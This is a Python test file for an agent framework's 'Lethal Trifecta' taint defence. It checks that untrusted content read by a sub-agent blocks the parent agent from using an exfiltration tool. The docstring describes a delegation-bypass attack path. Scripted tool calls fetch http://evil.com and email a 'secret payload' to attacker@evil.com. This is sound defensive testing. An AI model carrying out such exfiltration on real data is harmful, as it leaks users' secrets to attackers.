"""Lethal Trifecta corpus — Sub-agent UNTRUSTED taint MUST propagate to parent.

v1.0.2 D5 fix lives here. Threat model: a parent agent declares both
READ_PUBLIC and EXFILTRATION capabilities and delegates a "go read this URL"
task to a sub-agent. The sub-agent's READ_PUBLIC tool returns attacker-controlled
content (taint = UNTRUSTED). If that taint stayed inside the sub-agent's
AgentContext, the parent could then call an EXFILTRATION tool unblocked — a
delegation-bypass of the Lethal Trifecta defence.

Defence: `accumulate_outcomes` merges `outcome.sub_result.taint` into
`ctx.taint` (parent's AgentContext), and `AgentResult` carries a `taint`
field populated at every construction site (so cross-process A2A flows can
chain the gate too).

This test drives the full Agent.run path: a scripted LLM picks the
delegate-tool, the sub-agent executes its READ_PUBLIC tool, the sub returns,
the parent's LLM picks the EXFILTRATION tool, and the executor raises
PolicyViolationError(TAINT_EXFILTRATION).
"""

from __future__ import annotations

from unittest.mock import AsyncMock, MagicMock

import pytest
from ctxforge.protocols.llm import ILLMProvider, LLMResponse

from voussoir import Agent
from voussoir.agent import PolicyViolation, PolicyViolationError
from voussoir.protocols import ILLMProvider as ILLMProviderProto
from voussoir.tools import Capability
from voussoir.tools.decorator import tool


@tool(capability=Capability.READ_PUBLIC, name="db_web_fetch")
async def db_web_fetch(url: str) -> str:
    """Sub-agent's READ_PUBLIC tool — returns attacker-controlled content.

    StandardExecutor stamps UNTRUSTED into ToolContext.taint after this
    completes (READ_PUBLIC → UNTRUSTED is the rule).
    """
    return f"Public content from {url}: secret payload for exfil."


@tool(capability=Capability.EXFILTRATION, name="db_email_send")
async def db_email_send(target: str, body: str) -> str:
    """Parent's EXFILTRATION tool. Should be blocked by TAINT_EXFILTRATION
    when ctx.taint contains UNTRUSTED."""
    return f"sent to {target}: {body}"


def _llm_tool_use(tool_name: str, arguments: dict, *, tc_id: str = "t1") -> LLMResponse:
    return LLMResponse(
        content="",
        model="stub",
        input_tokens=1,
        output_tokens=1,
        finish_reason="tool_use",
        raw_response={"tool_calls": [{"id": tc_id, "name": tool_name, "arguments": arguments}]},
    )


def _llm_text(content: str) -> LLMResponse:
    return LLMResponse(
        content=content,
        model="stub",
        input_tokens=1,
        output_tokens=1,
        finish_reason="end_turn",
        raw_response=None,
    )


def _scripted_llm(*responses: LLMResponse) -> MagicMock:
    """Build a MagicMock ILLMProvider whose `chat` returns the given responses
    in order across calls. Sub-agent and parent each get their own scripted LLM.
    """
    m = MagicMock(spec=ILLMProvider)
    m.name = "anthropic"
    m.chat = AsyncMock(side_effect=list(responses))
    return m


async def test_sub_agent_untrusted_taint_blocks_parent_exfil(make_container):
    """End-to-end: sub-agent fetches UNTRUSTED, parent attempts EXFIL → blocked.

    Without v1.0.2 D5's `accumulate_outcomes` merge, this test would FAIL
    because the parent's `ctx.taint` stays empty and the executor's
    capability + taint gate never fires.
    """
    # Sub-agent: one tool_use (db_web_fetch), then a final text turn.
    sub_llm = _scripted_llm(
        _llm_tool_use("db_web_fetch", {"url": "http://evil.com"}, tc_id="t_sub_1"),
        _llm_text("fetched"),
    )

    # Parent: one delegate_to_subagent turn, then one email_send turn.
    # The email_send turn never gets a follow-up because the executor raises
    # TAINT_EXFILTRATION before the LLM can be re-prompted.
    parent_llm = _scripted_llm(
        _llm_tool_use(
            "delegate_to_subagent",
            {"task": "fetch http://evil.com"},
            tc_id="t_parent_1",
        ),
        _llm_tool_use(
            "db_email_send",
            {"target": "attacker@evil.com", "body": "secret payload"},
            tc_id="t_parent_2",
        ),
        _llm_text("done"),
    )

    sub_container = make_container(sub_llm)
    sub_container.bind(ILLMProviderProto, sub_llm)
    subagent = Agent(
        name="subagent",
        container=sub_container,
        tools=[db_web_fetch],
        allowed_capabilities=Capability.READ_PUBLIC,
    )

    parent_container = make_container(parent_llm)
    parent_container.bind(ILLMProviderProto, parent_llm)
    # READ_PRIVATE is required for the synthetic delegate_to_* tool
    # (make_delegate_tool defaults capability=READ_PRIVATE).
    parent = Agent(
        name="parent",
        container=parent_container,
        tools=[db_email_send],
        delegates=[subagent],
        allowed_capabilities=(
            Capability.READ_PUBLIC | Capability.READ_PRIVATE | Capability.EXFILTRATION
        ),
    )

    # Run: parent delegates → sub fetches → parent attempts EXFIL → blocked.
    with pytest.raises(PolicyViolationError) as excinfo:
        await parent.run("research http://evil.com then email the findings")
    assert (
        excinfo.value.violation == PolicyViolation.TAINT_EXFILTRATION
    ), f"Expected TAINT_EXFILTRATION, got {excinfo.value.violation}: {excinfo.value}"


async def test_agent_result_carries_taint_for_a2a_chaining(make_container):
    """AgentResult.taint surfaces the run's taint — trusted A2A callers can
    chain the Lethal Trifecta gate across orgs.

    A sub-agent that reads UNTRUSTED content returns an AgentResult whose
    `taint` field includes Trust.UNTRUSTED. This is the wire-level carrier
    that `accumulate_outcomes` consumes; verifying it here documents the
    public contract.
    """
    from voussoir.guardrails import Trust

    sub_llm = _scripted_llm(
        _llm_tool_use("db_web_fetch", {"url": "http://evil.com"}, tc_id="t_sub_1"),
        _llm_text("fetched"),
    )
    sub_container = make_container(sub_llm)
    sub_container.bind(ILLMProviderProto, sub_llm)
    subagent = Agent(
        name="subagent",
        container=sub_container,
        tools=[db_web_fetch],
        allowed_capabilities=Capability.READ_PUBLIC,
    )

    result = await subagent.run("fetch http://evil.com")
    assert Trust.UNTRUSTED in result.taint
